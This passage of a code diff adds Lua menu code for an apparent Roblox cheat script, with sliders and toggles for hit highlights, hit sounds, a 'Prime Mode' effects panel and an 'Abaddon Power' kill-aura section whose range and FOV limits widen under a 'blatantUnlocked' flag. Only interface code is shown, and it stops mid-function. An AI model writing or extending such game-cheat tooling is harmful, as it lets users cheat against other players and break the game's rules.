+            {lbl="Green", col=Color3.fromRGB(80,255,80),  get=function() return hitChamsG end, set=function(v) hitChamsG=v end, key="hitChamsG"},
+            {lbl="Blue",  col=Color3.fromRGB(80,80,255),  get=function() return hitChamsB end, set=function(v) hitChamsB=v end, key="hitChamsB"},
+        }
+        for _,def in ipairs(sliderDefs) do
+            local fr=Instance.new("Frame",drop); fr.Size=UDim2.new(1,0,0,30); fr.BackgroundTransparency=1
+            local ll=Instance.new("TextLabel",fr); ll.Size=UDim2.new(1,0,0,14); ll.BackgroundTransparency=1
+            ll.TextColor3=def.col; ll.Font=Enum.Font.GothamBold; ll.TextSize=10
+            ll.TextXAlignment=Enum.TextXAlignment.Left; ll.Text=def.lbl..": "..def.get()
+            local slBg=Instance.new("TextButton",fr)
+            slBg.Size=UDim2.new(1,0,0,10); slBg.Position=UDim2.new(0,0,0,18)
+            slBg.BackgroundColor3=Color3.fromRGB(40,40,40); slBg.BackgroundTransparency=0.5
+            slBg.AutoButtonColor=false; slBg.Text=""; slBg.BorderSizePixel=0
+            Instance.new("UICorner",slBg).CornerRadius=UDim.new(1,0)
+            local slFill=Instance.new("Frame",slBg)
+            slFill.Name="HCSliderFill"; slFill.Size=UDim2.new(def.get()/255,0,1,0)
+            slFill.BackgroundColor3=def.col; slFill.BorderSizePixel=0
+            Instance.new("UICorner",slFill).CornerRadius=UDim.new(1,0)
+            local drag=false
+            local function apply(v)
+                def.set(v); slFill.Size=UDim2.new(v/255,0,1,0)
+                ll.Text=def.lbl..": "..v
+                updatePreview()
+            end
+            sliderSyncFns[def.key]=function(v) apply(v) end
+            slBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=true end end)
+            slBg.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=false end end)
+            UIS.InputChanged:Connect(function(i)
+                if drag and i.UserInputType==Enum.UserInputType.MouseMovement then
+                    local sz=slBg.AbsoluteSize.X; if sz<1 then return end
+                    local rx=math.clamp((i.Position.X-slBg.AbsolutePosition.X)/sz,0,1)
+                    apply(math.floor(rx*255))
+                end
+            end)
+        end
+
+        -- Intensity slider (theme color)
+        local intFr=Instance.new("Frame",drop); intFr.Size=UDim2.new(1,0,0,30); intFr.BackgroundTransparency=1
+        local intLl=Instance.new("TextLabel",intFr); intLl.Size=UDim2.new(1,0,0,14); intLl.BackgroundTransparency=1
+        intLl.TextColor3=currentThemeColor; intLl.Font=Enum.Font.GothamBold; intLl.TextSize=10
+        intLl.TextXAlignment=Enum.TextXAlignment.Left
+        intLl.Text="Intensity: "..math.floor(hitChamsIntensity*100).."%"
+        local intBg=Instance.new("TextButton",intFr)
+        intBg.Size=UDim2.new(1,0,0,10); intBg.Position=UDim2.new(0,0,0,18)
+        intBg.BackgroundColor3=Color3.fromRGB(40,40,40); intBg.BackgroundTransparency=0.5
+        intBg.AutoButtonColor=false; intBg.Text=""; intBg.BorderSizePixel=0
+        Instance.new("UICorner",intBg).CornerRadius=UDim.new(1,0)
+        local intFill=Instance.new("Frame",intBg)
+        intFill.Name="HCSliderFill"; intFill.Size=UDim2.new(hitChamsIntensity,0,1,0)
+        intFill.BackgroundColor3=currentThemeColor; intFill.BorderSizePixel=0
+        Instance.new("UICorner",intFill).CornerRadius=UDim.new(1,0)
+        local intDrag=false
+        local function applyInt(v)
+            hitChamsIntensity=v; intFill.Size=UDim2.new(v,0,1,0)
+            intLl.Text="Intensity: "..math.floor(v*100).."%"
+        end
+        sliderSyncFns["hitChamsIntensity"]=function(v) applyInt(v) end
+        intBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then intDrag=true end end)
+        intBg.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then intDrag=false end end)
+        UIS.InputChanged:Connect(function(i)
+            if intDrag and i.UserInputType==Enum.UserInputType.MouseMovement then
+                local sz=intBg.AbsoluteSize.X; if sz<1 then return end
+                local rx=math.clamp((i.Position.X-intBg.AbsolutePosition.X)/sz,0,1)
+                applyInt(rx)
+            end
+        end)
+
+        -- Duration slider 0.0-1.0s
+        local durFr=Instance.new("Frame",drop); durFr.Size=UDim2.new(1,0,0,30); durFr.BackgroundTransparency=1
+        local durLl=Instance.new("TextLabel",durFr); durLl.Size=UDim2.new(1,0,0,14); durLl.BackgroundTransparency=1
+        durLl.TextColor3=currentThemeColor; durLl.Font=Enum.Font.GothamBold; durLl.TextSize=10
+        durLl.TextXAlignment=Enum.TextXAlignment.Left
+        durLl.Text="Duration: "..string.format("%.1f",hitChamsDuration).."s"
+        local durBg=Instance.new("TextButton",durFr)
+        durBg.Size=UDim2.new(1,0,0,10); durBg.Position=UDim2.new(0,0,0,18)
+        durBg.BackgroundColor3=Color3.fromRGB(40,40,40); durBg.BackgroundTransparency=0.5
+        durBg.AutoButtonColor=false; durBg.Text=""; durBg.BorderSizePixel=0
+        Instance.new("UICorner",durBg).CornerRadius=UDim.new(1,0)
+        local durFill=Instance.new("Frame",durBg)
+        durFill.Name="HCSliderFill"; durFill.Size=UDim2.new(hitChamsDuration,0,1,0)
+        durFill.BackgroundColor3=currentThemeColor; durFill.BorderSizePixel=0
+        Instance.new("UICorner",durFill).CornerRadius=UDim.new(1,0)
+        local durDrag=false
+        local function applyDur(v)
+            v=math.clamp(math.floor(v*10+0.5)/10,0,1)
+            hitChamsDuration=v; durFill.Size=UDim2.new(v,0,1,0)
+            durLl.Text="Duration: "..string.format("%.1f",v).."s"
+        end
+        sliderSyncFns["hitChamsDur"]=function(v) applyDur(v) end
+        durBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then durDrag=true end end)
+        durBg.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then durDrag=false end end)
+        UIS.InputChanged:Connect(function(i)
+            if durDrag and i.UserInputType==Enum.UserInputType.MouseMovement then
+                local sz=durBg.AbsoluteSize.X; if sz<1 then return end
+                applyDur((i.Position.X-durBg.AbsolutePosition.X)/sz)
+            end
+        end)
+
+        local HC_EXPANDED=5*(30+4)+(36+4)
+        local hcExpanded=false
+        arr.MouseButton1Click:Connect(function()
+            hcExpanded=not hcExpanded; arr.Text=hcExpanded and "^" or "v"
+            TS:Create(drop,TweenInfo.new(0.25),{Size=UDim2.new(1,0,0,hcExpanded and HC_EXPANDED or 0)}):Play()
+            TS:Create(sec, TweenInfo.new(0.25),{Size=UDim2.new(1,0,0,hcExpanded and 32+HC_EXPANDED or 32)}):Play()
+        end)
+    end
+
+    local function createHitSoundSection()
+        local hsContainer = Instance.new("Frame", s); hsContainer.Name="HitSoundContainer"; hsContainer.Size=UDim2.new(1,0,0,32); hsContainer.BackgroundTransparency=1; hsContainer.ClipsDescendants=true
+        local top = Instance.new("Frame", hsContainer); top.Size=UDim2.new(1,0,0,32); top.BackgroundTransparency=1
+        local toggleBtn = Instance.new("TextButton", top); toggleBtn.Size=UDim2.new(0.8,-4,1,0); toggleBtn.Text="Toggle Hit Sound"; toggleBtn.Font=Enum.Font.Gotham; toggleBtn.TextSize=14; toggleBtn.AutoButtonColor=false
+        toggleBtn.BackgroundTransparency = 0.6
+        Instance.new("UICorner",toggleBtn).CornerRadius=UDim.new(0,12)
+        activeButtonStates[toggleBtn] = false
+        buttonSyncFns["hitSound"] = function(st) activeButtonStates[toggleBtn]=st; toggleBtn.BackgroundColor3=st and currentThemeColor or Color3.fromRGB(40,40,40); toggleBtn.BackgroundTransparency=st and 0.3 or 0.6; toggleBtn.TextColor3=st and Color3.new(0,0,0) or Color3.new(1,1,1) end
+        
+        local function updTog()
+            toggleBtn.BackgroundColor3 = isHitSoundEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            toggleBtn.BackgroundTransparency = isHitSoundEnabled and 0.3 or 0.6
+            toggleBtn.TextColor3 = isHitSoundEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updTog()
+        
+        toggleBtn.MouseButton1Click:Connect(function() 
+            isHitSoundEnabled = not isHitSoundEnabled
+            activeButtonStates[toggleBtn] = isHitSoundEnabled
+            updTog() 
+        end)
+        
+        local arrow = Instance.new("TextButton", top); arrow.Size=UDim2.new(0.2,0,1,0); arrow.Position=UDim2.new(0.8,0,0,0); arrow.BackgroundColor3=Color3.fromRGB(35,35,35); arrow.Text="v"; arrow.TextColor3=Color3.new(1,1,1); arrow.Font=Enum.Font.GothamBold; arrow.TextSize=14; arrow.AutoButtonColor=false
+        arrow.BackgroundTransparency = 0.6
+        Instance.new("UICorner",arrow).CornerRadius=UDim.new(0,12)
+        local drop = Instance.new("Frame", hsContainer); drop.Size=UDim2.new(1,0,0,110); drop.Position=UDim2.new(0,0,0,36); drop.BackgroundTransparency=1
+        local dropLayout = Instance.new("UIListLayout", drop); dropLayout.Padding=UDim.new(0,5)
+        local function updateHitSoundId(newId)
+            if string.find(newId, "rbxassetid://") then hitSoundId = newId else hitSoundId = "rbxassetid://" .. newId end
+        end
+        local idBox = Instance.new("TextBox", drop); idBox.Size=UDim2.new(1,0,0,30); idBox.BackgroundColor3=Color3.fromRGB(30,30,30); idBox.Text=string.gsub(hitSoundId, "rbxassetid://", ""); sliderSyncFns["hitSoundId"] = function(v) idBox.Text=string.gsub(v,"rbxassetid://","") end; idBox.PlaceholderText="Custom ID"; idBox.TextColor3=Color3.new(1,1,1); idBox.Font=Enum.Font.Gotham; idBox.TextSize=10; Instance.new("UICorner",idBox).CornerRadius=UDim.new(0,8)
+        idBox.BackgroundTransparency = 0.6
+        idBox.FocusLost:Connect(function() updateHitSoundId(idBox.Text) end)
+        local function mkPreset(name, id)
+            local btn = Instance.new("TextButton", drop); btn.Size=UDim2.new(1,0,0,30); btn.BackgroundColor3=Color3.fromRGB(35,35,35); btn.Text=name; btn.TextColor3=Color3.new(1,1,1); btn.Font=Enum.Font.Gotham; btn.TextSize=12; Instance.new("UICorner",btn).CornerRadius=UDim.new(0,8)
+            btn.BackgroundTransparency = 0.6
+            btn.MouseButton1Click:Connect(function() updateHitSoundId(id); idBox.Text = id end)
+        end
+        mkPreset("Minecraft", "8632670510")
+        mkPreset("sadkid246", "107882460114989")
+        local expanded = false
+        arrow.MouseButton1Click:Connect(function()
+            expanded = not expanded
+            arrow.Text = expanded and "^" or "v"
+            TS:Create(hsContainer, TweenInfo.new(0.3), {Size = expanded and UDim2.new(1,0,0,150) or UDim2.new(1,0,0,32)}):Play()
+        end)
+    end
+
+    -- ============================================================
+    --        ABADDON POWER (KILL AURA) SECTION IN VISUALS
+    -- ============================================================
+    local function createPrimeModeSection()
+        local sec = Instance.new("Frame", s)
+        sec.Name = "PrimeModeSection"
+        sec.Size = UDim2.new(1, 0, 0, 32)
+        sec.BackgroundTransparency = 1
+        Instance.new("UIListLayout", sec).SortOrder = Enum.SortOrder.LayoutOrder
+
+        local c = Instance.new("Frame", sec)
+        c.Size = UDim2.new(1, 0, 0, 32)
+        c.BackgroundTransparency = 1
+
+        local mainBtn = Instance.new("TextButton", c)
+        mainBtn.Size = UDim2.new(1, -36, 1, 0)
+        mainBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        mainBtn.BackgroundTransparency = 0.6
+        mainBtn.Text = "Prime Mode"
+        mainBtn.TextColor3 = Color3.new(1, 1, 1)
+        mainBtn.Font = Enum.Font.Gotham
+        mainBtn.TextSize = 14
+        mainBtn.AutoButtonColor = false
+        mainBtn.BorderSizePixel = 0
+        Instance.new("UICorner", mainBtn).CornerRadius = UDim.new(0, 12)
+
+        activeButtonStates[mainBtn] = isPrimeModeEnabled
+        buttonSyncFns["primeMode"] = function(st)
+            isPrimeModeEnabled = st
+            mainBtn.BackgroundColor3 = st and currentThemeColor or Color3.fromRGB(40, 40, 40)
+            mainBtn.BackgroundTransparency = st and 0.3 or 0.6
+            mainBtn.TextColor3 = st and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
+            activeButtonStates[mainBtn] = st
+        end
+        mainBtn.MouseButton1Click:Connect(function()
+            togglePrimeMode(not isPrimeModeEnabled)
+            local st = isPrimeModeEnabled
+            mainBtn.BackgroundColor3 = st and currentThemeColor or Color3.fromRGB(40, 40, 40)
+            mainBtn.BackgroundTransparency = st and 0.3 or 0.6
+            mainBtn.TextColor3 = st and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
+            activeButtonStates[mainBtn] = st
+        end)
+
+        local arr = Instance.new("TextButton", c)
+        arr.Size = UDim2.new(0, 30, 1, 0)
+        arr.Position = UDim2.new(1, -30, 0, 0)
+        arr.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        arr.BackgroundTransparency = 0.6
+        arr.Text = "v"
+        arr.TextColor3 = Color3.new(1, 1, 1)
+        arr.Font = Enum.Font.GothamBold
+        arr.TextSize = 13
+        arr.AutoButtonColor = false
+        arr.BorderSizePixel = 0
+        Instance.new("UICorner", arr).CornerRadius = UDim.new(0, 12)
+
+        local drop = Instance.new("Frame", sec)
+        drop.Size = UDim2.new(1, 0, 0, 0)
+        drop.BackgroundTransparency = 1
+        drop.ClipsDescendants = true
+        local dropLayout = Instance.new("UIListLayout", drop)
+        dropLayout.Padding = UDim.new(0, 4)
+
+        -- Volume Slider 0.0 - 5.0
+        local volFrame = Instance.new("Frame", drop)
+        volFrame.Size = UDim2.new(1, 0, 0, 30)
+        volFrame.BackgroundTransparency = 1
+
+        local volLbl = Instance.new("TextLabel", volFrame)
+        volLbl.Text = "Volume: " .. string.format("%.1f", primeModeVolume)
+        volLbl.Size = UDim2.new(1, 0, 0, 14)
+        volLbl.BackgroundTransparency = 1
+        volLbl.TextColor3 = Color3.new(1, 1, 1)
+        volLbl.Font = Enum.Font.GothamBold
+        volLbl.TextSize = 10
+        volLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+        local volBg = Instance.new("TextButton", volFrame)
+        volBg.Size = UDim2.new(1, 0, 0, 10)
+        volBg.Position = UDim2.new(0, 0, 0, 18)
+        volBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        volBg.BackgroundTransparency = 0.5
+        volBg.AutoButtonColor = false
+        volBg.Text = ""
+        volBg.BorderSizePixel = 0
+        Instance.new("UICorner", volBg).CornerRadius = UDim.new(1, 0)
+
+        local volFill = Instance.new("Frame", volBg)
+        volFill.Name = "SliderFill"
+        volFill.Size = UDim2.new(primeModeVolume / 5, 0, 1, 0)
+        volFill.BackgroundColor3 = currentThemeColor
+        volFill.BackgroundTransparency = 0.2
+        volFill.BorderSizePixel = 0
+        Instance.new("UICorner", volFill).CornerRadius = UDim.new(1, 0)
+
+        sliderSyncFns["primeModeVolume"] = function(v)
+            primeModeVolume = v
+            volFill.Size = UDim2.new(v / 5, 0, 1, 0)
+            volLbl.Text = "Volume: " .. string.format("%.1f", v)
+            if primeModeSound then pcall(function() primeModeSound.Volume = v end) end
+        end
+
+        local volDrag = false
+        volBg.InputBegan:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then volDrag = true end
+        end)
+        volBg.InputEnded:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then volDrag = false end
+        end)
+        UIS.InputChanged:Connect(function(inp)
+            if volDrag and inp.UserInputType == Enum.UserInputType.MouseMovement then
+                local rx = math.clamp((inp.Position.X - volBg.AbsolutePosition.X) / volBg.AbsoluteSize.X, 0, 1)
+                local v = math.floor(rx * 50 + 0.5) / 10
+                primeModeVolume = v
+                volFill.Size = UDim2.new(v / 5, 0, 1, 0)
+                volLbl.Text = "Volume: " .. string.format("%.1f", v)
+                if primeModeSound then pcall(function() primeModeSound.Volume = v end) end
+            end
+        end)
+
+        -- Echo (AmbientReverb) toggle
+        local echoBtn = Instance.new("TextButton", drop)
+        echoBtn.Size = UDim2.new(1, 0, 0, 30)
+        echoBtn.Font = Enum.Font.Gotham
+        echoBtn.TextSize = 13
+        echoBtn.AutoButtonColor = false
+        echoBtn.BorderSizePixel = 0
+        Instance.new("UICorner", echoBtn).CornerRadius = UDim.new(0, 8)
+        local function updEchoBtn()
+            echoBtn.Text = primeModeEcho and "Echo: ON" or "Echo: OFF"
+            echoBtn.BackgroundColor3 = primeModeEcho and currentThemeColor or Color3.fromRGB(40, 40, 40)
+            echoBtn.BackgroundTransparency = primeModeEcho and 0.3 or 0.6
+            echoBtn.TextColor3 = primeModeEcho and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
+        end
+        updEchoBtn()
+        sliderSyncFns["primeModeEcho"] = function(v)
+            primeModeEcho = v
+            updEchoBtn()
+            if isPrimeModeEnabled then
+                pcall(function()
+                    game:GetService("SoundService").AmbientReverb =
+                        v and Enum.ReverbType.Cave or Enum.ReverbType.NoReverb
+                end)
+            end
+        end
+        echoBtn.MouseButton1Click:Connect(function()
+            primeModeEcho = not primeModeEcho
+            updEchoBtn()
+            if isPrimeModeEnabled then
+                pcall(function()
+                    game:GetService("SoundService").AmbientReverb =
+                        primeModeEcho and Enum.ReverbType.Cave or Enum.ReverbType.NoReverb
+                end)
+            end
+        end)
+
+        -- Keybind
+        local kbBtn = Instance.new("TextButton", drop)
+        kbBtn.Size = UDim2.new(1, 0, 0, 30)
+        kbBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        kbBtn.BackgroundTransparency = 0.5
+        kbBtn.Text = (primeModeKeybind == Enum.KeyCode.Unknown) and "Bind: Not set" or ("Bind: " .. primeModeKeybind.Name)
+        kbBtn.TextColor3 = Color3.new(1, 1, 1)
+        kbBtn.Font = Enum.Font.Gotham
+        kbBtn.TextSize = 13
+        kbBtn.BorderSizePixel = 0
+        Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 8)
+
+        sliderSyncFns["primeBind"] = function()
+            kbBtn.Text = (primeModeKeybind == Enum.KeyCode.Unknown) and "Bind: Not set" or ("Bind: " .. primeModeKeybind.Name)
+        end
+
+        kbBtn.MouseButton1Click:Connect(function()
+            kbBtn.Text = "Press a key..."
+            local conn
+            conn = UIS.InputBegan:Connect(function(inp, gpe)
+                if not gpe and inp.KeyCode ~= Enum.KeyCode.Unknown then
+                    primeModeKeybind = inp.KeyCode
+                    kbBtn.Text = "Bind: " .. inp.KeyCode.Name
+                    conn:Disconnect()
+                end
+            end)
+        end)
+
+        -- FOV change toggle
+        local fovToggleBtn = Instance.new("TextButton", drop)
+        fovToggleBtn.Size = UDim2.new(1, 0, 0, 30)
+        fovToggleBtn.Font = Enum.Font.Gotham
+        fovToggleBtn.TextSize = 13
+        fovToggleBtn.AutoButtonColor = false
+        fovToggleBtn.BorderSizePixel = 0
+        Instance.new("UICorner", fovToggleBtn).CornerRadius = UDim.new(0, 8)
+        local function updFovBtn()
+            fovToggleBtn.Text = primeModeChangeFov and "FOV Change: ON" or "FOV Change: OFF"
+            fovToggleBtn.BackgroundColor3 = primeModeChangeFov and currentThemeColor or Color3.fromRGB(40,40,40)
+            fovToggleBtn.BackgroundTransparency = primeModeChangeFov and 0.3 or 0.6
+            fovToggleBtn.TextColor3 = primeModeChangeFov and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updFovBtn()
+        sliderSyncFns["primeModeChangeFov"] = function(v)
+            primeModeChangeFov = v
+            updFovBtn()
+            if not v then pcall(function() if primeModeOrigFov then camera.FieldOfView = primeModeOrigFov end end) end
+        end
+        fovToggleBtn.MouseButton1Click:Connect(function()
+            primeModeChangeFov = not primeModeChangeFov
+            updFovBtn()
+            if not primeModeChangeFov then pcall(function() if primeModeOrigFov then camera.FieldOfView = primeModeOrigFov end end) end
+        end)
+
+        -- Shake Slider 0.0 - 3.0
+        local shkFrame = Instance.new("Frame", drop)
+        shkFrame.Size = UDim2.new(1, 0, 0, 30)
+        shkFrame.BackgroundTransparency = 1
+        local shkLbl = Instance.new("TextLabel", shkFrame)
+        shkLbl.Text = "Shake: " .. string.format("%.1f", primeModeShake)
+        shkLbl.Size = UDim2.new(1, 0, 0, 14)
+        shkLbl.BackgroundTransparency = 1
+        shkLbl.TextColor3 = Color3.new(1, 1, 1)
+        shkLbl.Font = Enum.Font.GothamBold
+        shkLbl.TextSize = 10
+        shkLbl.TextXAlignment = Enum.TextXAlignment.Left
+        local shkBg = Instance.new("TextButton", shkFrame)
+        shkBg.Size = UDim2.new(1, 0, 0, 10)
+        shkBg.Position = UDim2.new(0, 0, 0, 18)
+        shkBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        shkBg.BackgroundTransparency = 0.5
+        shkBg.AutoButtonColor = false
+        shkBg.Text = ""
+        shkBg.BorderSizePixel = 0
+        Instance.new("UICorner", shkBg).CornerRadius = UDim.new(1, 0)
+        local shkFill = Instance.new("Frame", shkBg)
+        shkFill.Name = "SliderFill"
+        shkFill.Size = UDim2.new(primeModeShake / 3, 0, 1, 0)
+        shkFill.BackgroundColor3 = currentThemeColor
+        shkFill.BackgroundTransparency = 0.2
+        shkFill.BorderSizePixel = 0
+        Instance.new("UICorner", shkFill).CornerRadius = UDim.new(1, 0)
+        sliderSyncFns["primeModeShake"] = function(v)
+            primeModeShake = v
+            shkFill.Size = UDim2.new(v / 3, 0, 1, 0)
+            shkLbl.Text = "Shake: " .. string.format("%.1f", v)
+        end
+        local shkDrag = false
+        shkBg.InputBegan:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then shkDrag = true end
+        end)
+        shkBg.InputEnded:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then shkDrag = false end
+        end)
+        UIS.InputChanged:Connect(function(inp)
+            if shkDrag and inp.UserInputType == Enum.UserInputType.MouseMovement then
+                local rx = math.clamp((inp.Position.X - shkBg.AbsolutePosition.X) / shkBg.AbsoluteSize.X, 0, 1)
+                local v = math.floor(rx * 30 + 0.5) / 10
+                primeModeShake = v
+                shkFill.Size = UDim2.new(v / 3, 0, 1, 0)
+                shkLbl.Text = "Shake: " .. string.format("%.1f", v)
+            end
+        end)
+
+        -- Expand / Collapse
+        local expanded = false
+        local COLLAPSED = 32
+        local EXPANDED  = 32 + 8 + 30 + 4 + 30 + 4 + 30 + 4 + 30 + 4 + 30
+        arr.MouseButton1Click:Connect(function()
+            expanded = not expanded
+            arr.Text = expanded and "^" or "v"
+            TS:Create(drop, TweenInfo.new(0.25), {Size = UDim2.new(1, 0, 0, expanded and (EXPANDED - COLLAPSED) or 0)}):Play()
+            TS:Create(sec,  TweenInfo.new(0.25), {Size = UDim2.new(1, 0, 0, expanded and EXPANDED or COLLAPSED)}):Play()
+        end)
+    end
+
+    local function createAbaddonPowerSection()
+        if getgenv()._abaddonPowerSectionCreated then return end
+        getgenv()._abaddonPowerSectionCreated = true
+        local c = Instance.new("Frame", s)
+        c.LayoutOrder = -1  -- appear first in scroll
+        c.Name = "AbaddonPowerContainer"
+        c.Size = UDim2.new(1, 0, 0, 32)
+        c.LayoutOrder = 0  -- first in list
+        c.BackgroundTransparency = 1
+        c.ClipsDescendants = true
+
+        local top = Instance.new("Frame", c)
+        top.Size = UDim2.new(1, 0, 0, 32)
+        top.BackgroundTransparency = 1
+
+        -- Main toggle button — same font/size as all other sections
+        local main = Instance.new("TextButton", top)
+        main.Size = UDim2.new(0.8, -4, 1, 0)
+        main.Text = "Abaddon Power"
+        main.Font = Enum.Font.Gotham
+        main.TextSize = 14
+        main.AutoButtonColor = false
+        main.BackgroundTransparency = 0.6
+        Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+
+        activeButtonStates[main] = isAbaddonPowerEnabled
+        buttonSyncFns["powerEnabled"] = function(st) activeButtonStates[main]=st; main.BackgroundColor3=st and currentThemeColor or Color3.fromRGB(40,40,40); main.BackgroundTransparency=st and 0.3 or 0.6; main.TextColor3=st and Color3.new(0,0,0) or Color3.new(1,1,1) end
+        local function updMain()
+            main.BackgroundColor3 = isAbaddonPowerEnabled and currentThemeColor or Color3.fromRGB(40, 40, 40)
+            main.BackgroundTransparency = isAbaddonPowerEnabled and 0.3 or 0.6
+            main.TextColor3 = isAbaddonPowerEnabled and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
+        end
+        updMain()
+
+        main.MouseButton1Click:Connect(function()
+            isAbaddonPowerEnabled = not isAbaddonPowerEnabled
+            activeButtonStates[main] = isAbaddonPowerEnabled
+            syncAuraNotif()
+            updMain()
+        end)
+
+        -- Arrow expand button
+        local arr = Instance.new("TextButton", top)
+        arr.Size = UDim2.new(0.2, 0, 1, 0)
+        arr.Position = UDim2.new(0.8, 0, 0, 0)
+        arr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+        arr.Text = "v"
+        arr.TextColor3 = Color3.new(1, 1, 1)
+        arr.Font = Enum.Font.GothamBold
+        arr.TextSize = 14
+        arr.AutoButtonColor = false
+        arr.BackgroundTransparency = 0.6
+        Instance.new("UICorner", arr).CornerRadius = UDim.new(0, 12)
+
+        -- Dropdown: Range + FOV + Show FOV toggle + Keybind = ~160px
+        local drop = Instance.new("Frame", c)
+        drop.Size = UDim2.new(1, 0, 0, 160)
+        drop.Position = UDim2.new(0, 0, 0, 36)
+        drop.BackgroundTransparency = 1
+
+        local dropLayout = Instance.new("UIListLayout", drop)
+        dropLayout.Padding = UDim.new(0, 6)
+
+        -- ── Range Slider (0 – 24) ──────────────────────────────
+        local rangeFrame = Instance.new("Frame", drop)
+        rangeFrame.Size = UDim2.new(1, 0, 0, 30)
+        rangeFrame.BackgroundTransparency = 1
+
+        local rangeLbl = Instance.new("TextLabel", rangeFrame)
+        rangeLbl.Text = "Range: " .. string.format("%.1f", abaddonPowerRange)
+        rangeLbl.Size = UDim2.new(1, 0, 0, 14)
+        rangeLbl.BackgroundTransparency = 1
+        rangeLbl.TextColor3 = Color3.new(1, 1, 1)
+        rangeLbl.Font = Enum.Font.GothamBold
+        rangeLbl.TextSize = 10
+        rangeLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+        local rangeBg = Instance.new("TextButton", rangeFrame)
+        rangeBg.Size = UDim2.new(1, 0, 0, 10)
+        rangeBg.Position = UDim2.new(0, 0, 0, 18)
+        rangeBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        rangeBg.AutoButtonColor = false
+        rangeBg.Text = ""
+        rangeBg.BackgroundTransparency = 0.5
+        Instance.new("UICorner", rangeBg).CornerRadius = UDim.new(1, 0)
+
+        local rangeFill = Instance.new("Frame", rangeBg)
+        rangeFill.Name = "SliderFill"
+        rangeFill.Size = UDim2.new((abaddonPowerRange - 10) / 4, 0, 1, 0)
+        sliderSyncFns["powerRange"] = function(v) abaddonPowerRange=v; local rm=blatantUnlocked and 14 or 4; rangeFill.Size=UDim2.new(math.clamp((v-10)/rm,0,1),0,1,0); rangeLbl.Text="Range: "..string.format("%.1f",v) end
+        rangeFill.BackgroundColor3 = currentThemeColor
+        rangeFill.BorderSizePixel = 0
+        rangeFill.BackgroundTransparency = 0.2
+        Instance.new("UICorner", rangeFill).CornerRadius = UDim.new(1, 0)
+
+        local rangeDragging = false
+        rangeBg.InputBegan:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then rangeDragging = true end
+        end)
+        rangeBg.InputEnded:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then rangeDragging = false end
+        end)
+        UIS.InputChanged:Connect(function(inp)
+            if rangeDragging and inp.UserInputType == Enum.UserInputType.MouseMovement then
+                local rx = math.clamp((inp.Position.X - rangeBg.AbsolutePosition.X) / rangeBg.AbsoluteSize.X, 0, 1)
+                local rangeMax = blatantUnlocked and 14 or 4  -- 10+max = 24 or 14
+                local val = 10 + math.floor(rx * (rangeMax * 10) + 0.5) / 10
+                abaddonPowerRange = val
+                rangeFill.Size = UDim2.new((val - 10) / rangeMax, 0, 1, 0)
+                rangeLbl.Text = "Range: " .. string.format("%.1f", val)
+            end
+        end)
+
+        -- ── FOV Slider (30 – 360) ──────────────────────────────
+        local fovFrame = Instance.new("Frame", drop)
+        fovFrame.Size = UDim2.new(1, 0, 0, 30)
+        fovFrame.BackgroundTransparency = 1
+
+        local fovLbl = Instance.new("TextLabel", fovFrame)
+        fovLbl.Text = "FOV: " .. abaddonPowerFOV
+        fovLbl.Size = UDim2.new(1, 0, 0, 14)
+        fovLbl.BackgroundTransparency = 1
+        fovLbl.TextColor3 = Color3.new(1, 1, 1)
+        fovLbl.Font = Enum.Font.GothamBold
+        fovLbl.TextSize = 10
+        fovLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+        local fovBg = Instance.new("TextButton", fovFrame)
+        fovBg.Size = UDim2.new(1, 0, 0, 10)
+        fovBg.Position = UDim2.new(0, 0, 0, 18)
+        fovBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        fovBg.AutoButtonColor = false
+        fovBg.Text = ""
+        fovBg.BackgroundTransparency = 0.5
+        Instance.new("UICorner", fovBg).CornerRadius = UDim.new(1, 0)
+
+        local fovFill = Instance.new("Frame", fovBg)
+        fovFill.Name = "SliderFill"
+        fovFill.Size = UDim2.new((abaddonPowerFOV - 100) / 100, 0, 1, 0)
+        sliderSyncFns["powerFOV"] = function(v) abaddonPowerFOV=v; local fr=blatantUnlocked and 250 or 100; fovFill.Size=UDim2.new(math.clamp((v-100)/fr,0,1),0,1,0); fovLbl.Text="FOV: "..v end
+        fovFill.BackgroundColor3 = currentThemeColor
+        fovFill.BorderSizePixel = 0
+        fovFill.BackgroundTransparency = 0.2
+        Instance.new("UICorner", fovFill).CornerRadius = UDim.new(1, 0)
+
+        local fovDragging = false
+        fovBg.InputBegan:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then fovDragging = true end
+        end)
+        fovBg.InputEnded:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 then fovDragging = false end
